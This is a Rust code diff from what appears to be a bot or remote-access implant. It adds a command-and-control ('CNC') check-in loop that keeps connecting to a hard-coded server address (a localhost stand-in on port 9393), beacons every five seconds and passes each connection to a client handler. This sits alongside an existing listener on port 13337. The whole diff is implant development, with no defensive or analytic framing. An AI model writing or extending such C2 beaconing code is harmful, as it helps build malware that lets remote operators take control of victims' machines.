@@ -6,12 +6,17 @@ use std::alloc::System;
 static GLOBAL_ALLOCATOR: System = System;
 
 use std::{thread, time};
+use std::net::TcpStream;
+use crate::communication::server::handle_client;
 
 pub mod communication;
 pub mod os;
 
-const RETRY_INTERVAL_SECONDS: u64 = 60;
+const RETRY_INTERVAL_SECONDS: u64 = 5;
 const SERVER_LISTENING_PORT: u16 = 13337;
+
+const CNC_SERVER_IP: &str = "127.0.0.1";
+const CNC_SERVER_PORT: u16 = 9393;
 
 fn run_server_loop() {
     // Using loop here because in case we fail to create the server, we should try again.
@@ -33,7 +38,19 @@ fn run_server_loop() {
 
 fn run_cnc_connection_loop() {
     loop {
-        // For now, just sleep. TODO implement CNC
+        let server_address = format!("{}:{}", CNC_SERVER_IP, CNC_SERVER_PORT);
+        match TcpStream::connect(server_address) {
+            Ok(stream) => {
+                println!("Successfully connected to cnc server!");
+                thread::spawn(move || {
+                    // connection succeeded
+                    handle_client(stream)
+                });
+            }
+            Err(e) => {
+                println!("Failed to connect to cnc server, error: {}", e);
+            }
+        }
         std::thread::sleep(time::Duration::from_secs(RETRY_INTERVAL_SECONDS))
     }
 }
